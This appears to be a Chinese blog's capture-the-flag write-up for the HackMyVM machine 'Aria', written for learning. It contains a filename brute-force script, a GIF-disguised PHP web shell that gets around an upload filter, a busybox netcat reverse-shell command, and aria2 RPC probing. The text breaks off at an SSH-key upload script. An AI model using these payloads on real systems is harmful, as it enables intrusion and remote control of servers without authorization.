<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/e6dcfa5be8702d82.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e6dcfa5be8702d82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-bbf4b7181ea93b2c.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_buildManifest.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMAria","contentHtml":"\u003ch1\u003eAria.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Aria\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Aria\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003e端口扫描\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Aria nmap -sT -min-rate 10000 -p- 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:23 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.214\nHost is up (0.00037s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1337/tcp open  waste\nMAC Address: 08:00:27:9A:02:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 17.23 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Aria nmap -sT -A -p 22,80,1337 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:25 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.214\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey:\n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Ultra-Secure Naming Service\n|_http-server-header: Apache/2.4.62 (Debian)\n1337/tcp open  waste?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck:\n|     --- Aria Debug Shell ---\n|     Type \u003cspan class=\"hljs-string\"\u003e'exit'\u003c/span\u003e to quit ---\n|   GenericLines:\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e80 端口\u003c/h3\u003e\n\u003cp\u003e给出了一点信息\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e通过 \u003ccode\u003emd5(time()·rand(1,1000))\u003c/code\u003e ****生成不可预测的文件名\u003c/li\u003e\n\u003cli\u003e并且文件内容不可包含 \u003ccode\u003e\u0026#x3C;?php\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e以及文件名仅仅可以是 gif / jpg / png\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e\u0026#x3C;?php\u003c/code\u003e 可以通过 \u003ccode\u003e\u0026#x3C;?=\u003c/code\u003e 来绕过，文件名可以通过 \u003ccode\u003eGIF89a\u003c/code\u003e ，但是不可预测文件名需要想办法\u003c/p\u003e\n\u003ch3\u003e1337 端口\u003c/h3\u003e\n\u003cp\u003e扫描出来很奇怪，\u003ccode\u003enc\u003c/code\u003e 一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-sql\"\u003e➜Aria nc \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.214\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1337\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e--- Aria Debug Shell ---\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e--- Type 'exit' to quit ---\u003c/span\u003e\n\n$ help\nThis shell aids admins \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e debugging Aria services.\nUse \u003cspan class=\"hljs-keyword\"\u003especific\u003c/span\u003e commands \u003cspan class=\"hljs-keyword\"\u003eto\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eview\u003c/span\u003e logs \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e hidden path.\nNote: Web interface also provides foothold access.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e此 Shell 可帮助管理员调试 Aria 服务。\n使用特定命令查看日志或隐藏路径。\n注意：Web 界面也提供立足点访问权限。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e大概是可以通过特定命令来查看日志或隐藏路径\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ path\nYou\u003cspan class=\"hljs-string\"\u003e're close! Try a command related to revealing paths.\n$ path ls\nYou'\u003c/span\u003ere close! Try a \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e related to revealing paths.\n$ path \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\nYou\u003cspan class=\"hljs-string\"\u003e're close! Try a command related to revealing paths.\n$ path upload\nYou'\u003c/span\u003ere close! Try a \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e related to revealing paths.\n$ path \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\nYou\u003cspan class=\"hljs-string\"\u003e're close! Try a command related to revealing paths.\n$ path ls path\nYou'\u003c/span\u003ere close! Try a \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e related to revealing paths.\n$ path ll\nYou\u003cspan class=\"hljs-string\"\u003e're close! Try a command related to revealing paths.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e想不到，再看看 \u003ccode\u003eweb\u003c/code\u003e 端\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e爆破\u003c/h3\u003e\n\u003cp\u003e受不了，直接跟它爆了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/BOOM-4x_(2).gif\" alt=\"BOOM-4x (2).gif\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\nimport hashlib\nimport requests\nfrom datetime import datetime\n\n\u003cspan class=\"hljs-comment\"\u003e# --- 配置区 ---\u003c/span\u003e\nTARGET_IP = \u003cspan class=\"hljs-string\"\u003e'192.168.56.214'\u003c/span\u003e\nTARGET_PATH = \u003cspan class=\"hljs-string\"\u003e'/uploads/'\u003c/span\u003e\nFILE_EXTENSION = \u003cspan class=\"hljs-string\"\u003e'.gif'\u003c/span\u003e\nBASE_URL = f\u003cspan class=\"hljs-string\"\u003e\"http://{TARGET_IP}{TARGET_PATH}\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 时间范围（秒）。例如 10 表示从当前时间的前10秒到后10秒\u003c/span\u003e\nTIME_WINDOW_SECONDS = 10\n\u003cspan class=\"hljs-comment\"\u003e# 随机数范围\u003c/span\u003e\nRAND_MIN = 1\nRAND_MAX = 1000\n\n\u003cspan class=\"hljs-comment\"\u003e# --- 脚本核心逻辑 ---\u003c/span\u003e\n\ndef main():\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"主执行函数\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 计算起始和结束时间戳\u003c/span\u003e\n    current_time = int(time.time())\n    start_time = current_time - TIME_WINDOW_SECONDS\n    end_time = current_time + TIME_WINDOW_SECONDS\n\n    \u003cspan class=\"hljs-comment\"\u003e# 打印任务信息\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"=\"\u003c/span\u003e * 52)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"开始爆破...\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"目标主机: {BASE_URL}\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"成功条件: 响应状态码不为 404\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"时间范围: {datetime.fromtimestamp(start_time)} -\u003e {datetime.fromtimestamp(end_time)}\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"随机数范围: {RAND_MIN} - {RAND_MAX}\"\u003c/span\u003e)\n    total_attempts = (end_time - start_time + 1) * RAND_MAX\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"预计总尝试次数: {total_attempts:,}\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"=\"\u003c/span\u003e * 52)\n\n    \u003cspan class=\"hljs-comment\"\u003e# 使用 requests.Session() 可以复用TCP连接，提高效率\u003c/span\u003e\n    session = requests.Session()\n    session.headers.update({\n        \u003cspan class=\"hljs-string\"\u003e'User-Agent'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\u003c/span\u003e\n    }) \u003cspan class=\"hljs-comment\"\u003e# 添加一个常见的User-Agent，避免被一些简单的WAF拦截\u003c/span\u003e\n    \n    found = False\n    counter = 0\n\n    try:\n        \u003cspan class=\"hljs-comment\"\u003e# 外层循环遍历时间戳\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e t \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(start_time, end_time + 1):\n            \u003cspan class=\"hljs-comment\"\u003e# 内层循环遍历随机数\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e r \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(RAND_MIN, RAND_MAX + 1):\n                \u003cspan class=\"hljs-comment\"\u003e# 1. 生成原始字符串\u003c/span\u003e\n                original_string = f\u003cspan class=\"hljs-string\"\u003e\"{t}{r}\"\u003c/span\u003e\n                \n                \u003cspan class=\"hljs-comment\"\u003e# 2. 计算 MD5 哈希\u003c/span\u003e\n                md5_hash = hashlib.md5(original_string.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)).hexdigest()\n                \n                \u003cspan class=\"hljs-comment\"\u003e# 3. 构造完整的 URL\u003c/span\u003e\n                url = f\u003cspan class=\"hljs-string\"\u003e\"{BASE_URL}{md5_hash}{FILE_EXTENSION}\"\u003c/span\u003e\n                \n                \u003cspan class=\"hljs-comment\"\u003e# 实时显示进度\u003c/span\u003e\n                counter += 1\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e counter % 500 == 0:\n                    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"已尝试 {counter:,} 次, 当前时间戳: {t}    \"\u003c/span\u003e, end=\u003cspan class=\"hljs-string\"\u003e'\\r'\u003c/span\u003e)\n\n                try:\n                    \u003cspan class=\"hljs-comment\"\u003e# 4. 发送 HEAD 请求检查\u003c/span\u003e\n                    response = session.head(url, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=2, allow_redirects=True) \u003cspan class=\"hljs-comment\"\u003e# allow_redirects=True 可以跟随重定向\u003c/span\u003e\n                    \n                    \u003cspan class=\"hljs-comment\"\u003e# 5. 判断状态码 - 如果响应不是 404 Not Found，就认为是成功\u003c/span\u003e\n                    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e response.status_code != 404:\n                        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n\\n[+] 成功！发现一个非 404 响应！\"\u003c/span\u003e)\n                        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[+] 状态码: {response.status_code}\"\u003c/span\u003e) \u003cspan class=\"hljs-comment\"\u003e# 打印实际的状态码\u003c/span\u003e\n                        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[+] URL: {url}\"\u003c/span\u003e)\n                        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[+] 生成源: 时间戳={t}, 随机数={r}\"\u003c/span\u003e)\n                        found = True\n                        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e# 找到后直接退出函数\u003c/span\u003e\n                        \n                except requests.exceptions.RequestException:\n                    \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e\n\n    except KeyboardInterrupt:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n\\n[!] 用户手动中断了脚本。\"\u003c/span\u003e)\n    finally:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e\"=\"\u003c/span\u003e * 52)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e not found:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"爆破完成，未找到有效文件。\"\u003c/span\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"脚本执行结束。\"\u003c/span\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"=\"\u003c/span\u003e * 52)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    main()\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"file\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"nneo.gif\"\u003c/span\u003e\nContent-Type: image/gif\n\nGIF89a\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e写马子\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"file\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"nneo.gif\"\u003c/span\u003e\nContent-Type: image/gif\n\nGIF89a\n\u0026#x3C;?= phpinfo();\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_GET\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'x'\u003c/span\u003e]); ?\u003e\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过马子弹个 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e?x=busybox+nc+192.168.56.5+1234+-e+%2Fbin%2Fbash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以拿到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nflag{user-d13adadc6bbc1391394a5198cba2d1d7}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e首先拿到完整 shell （略）\u003c/p\u003e\n\u003cp\u003e查看正在监听端口，发现本地开着 \u003ccode\u003e6800\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Aria:/$ ss -tulpn\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   \nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      \ntcp     LISTEN   0        5                0.0.0.0:1337          0.0.0.0:*      \ntcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*      \ntcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      \ntcp     LISTEN   0        128                    *:80                  *:*      \ntcp     LISTEN   0        128                [::1]:6800             [::]:*      \ntcp     LISTEN   0        128                 [::]:22               [::]:* \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 socat 转发出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Aria:/tmp$ ./socat TCP-LISTEN:6801,fork TCP4:127.0.0.1:6800 \u0026#x26;\n[1] 25929\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但貌似并不是 HTTP 服务，结合吧唧名称和搜索引擎，大致确定是 aria2 的 RPC 端口，应该能从上面拿到什么文件\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAria2 是一款自由、跨平台命令行界面的下载管理器，该软件根据 GPLv2 许可证进行分发\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3\u003eAria2 PRC - 1\u003c/h3\u003e\n\u003cp\u003e找到官方文档，测试一下 PRC 接口\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://aria2.github.io/manual/en/html/aria2c.html#terminology\"\u003ehttps://aria2.github.io/manual/en/html/aria2c.html#terminology\u003c/a\u003e | \u003ca href=\"https://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket\"\u003ehttps://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e测试，确实有回显\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Aria curl 192.168.56.116:6801/jsonrpc\n{\u003cspan class=\"hljs-string\"\u003e\"id\"\u003c/span\u003e:null,\u003cspan class=\"hljs-string\"\u003e\"jsonrpc\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"2.0\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"error\"\u003c/span\u003e:{\u003cspan class=\"hljs-string\"\u003e\"code\"\u003c/span\u003e:-32600,\u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Invalid Request.\"\u003c/span\u003e}}# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试一下方法，发现需要认证\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e要使用 RPC 方法级授权，用户必须使用 \u003cstrong\u003e\u003ccode\u003e--rpc-secret\u003c/code\u003e\u003c/strong\u003e 选项指定 RPC 秘密授权令牌\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Aria curl \u003cspan class=\"hljs-string\"\u003e'192.168.56.116:6801/jsonrpc?method=aria2.tellStatus\u0026#x26;id=foo'\u003c/span\u003e                                   \n{\u003cspan class=\"hljs-string\"\u003e\"id\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"foo\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"jsonrpc\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"2.0\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"error\"\u003c/span\u003e:{\u003cspan class=\"hljs-string\"\u003e\"code\"\u003c/span\u003e:1,\u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Unauthorized\"\u003c/span\u003e}}# \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e零宽度字符\u003c/h3\u003e\n\u003cp\u003e所以现在的目标是要找到 \u003ccode\u003eToken\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e最后发现 \u003ccode\u003euser.txt\u003c/code\u003e 不正常\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eE2 80 8B\u003c/code\u003e\u003c/strong\u003e: 这是 UTF-8 编码下的 \u003cstrong\u003e零宽空格 (Zero-Width Space, ZWSP)\u003c/strong\u003e。它是一个在排版中用于在不断词的地方允许换行的字符，但它本身\u003cstrong\u003e完全不可见\u003c/strong\u003e，也不占据任何宽度。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eE2 80 8C\u003c/code\u003e\u003c/strong\u003e: 这是 UTF-8 编码下的 \u003cstrong\u003e零宽非连接符 (Zero-Width Non-Joiner, ZWNJ)\u003c/strong\u003e。它也是一个\u003cstrong\u003e完全不可见\u003c/strong\u003e的控制字符。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这应该是零宽度字节隐写，通过在线工具进行解密，通过搜索引擎搜索：Zero-Width Space Steganography 能找到可用的在线工具，尝试了很多个，最后这个能用\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://stegzero.com/\"\u003ehttps://stegzero.com/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到 \u003ccode\u003etoken: maze-sec\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eAria2 PRC - 2\u003c/h3\u003e\n\u003cp\u003e在文档中能看到上传的了例子，我们让 AI 进行修改一下，上传公钥文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/usr/bin/python2\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# -*- coding: utf-8 